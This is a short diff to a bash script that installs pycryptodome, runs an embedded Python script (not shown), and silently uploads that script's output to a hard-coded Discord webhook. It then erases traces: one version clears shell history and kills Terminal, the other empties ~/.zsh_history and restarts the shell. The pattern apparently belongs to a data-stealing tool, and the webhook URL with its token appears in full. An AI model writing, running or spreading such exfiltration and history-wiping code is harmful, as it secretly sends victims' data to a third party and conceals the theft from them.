@@ -1,4 +1,4 @@
-﻿#!/usr/bin/env bash
+
 pip3 install pycryptodome
 
 # Run Python script and capture its output
@@ -36,4 +36,4 @@ PYTHON
 # Send the captured output to Discord via webhook
 echo "$python_output" | curl -s -F "file=@-;filename=output.txt" \
 -F 'payload_json={"content":"📜 **Terminal Output**"}' \
-"https://discord.com/api/webhooks/1515854250385870910/BX921sqtZR-5TqkwVZ997azfOBV_auXxUEmTb8yZ2v97IIEzkqHww-OY_Q3V4eGOk1_g" && history -c; history-w; clear; killall Terminal
+"https://discord.com/api/webhooks/1515854250385870910/BX921sqtZR-5TqkwVZ997azfOBV_auXxUEmTb8yZ2v97IIEzkqHww-OY_Q3V4eGOk1_g" && clear; : > ~/.zsh_history && exec $SHELL
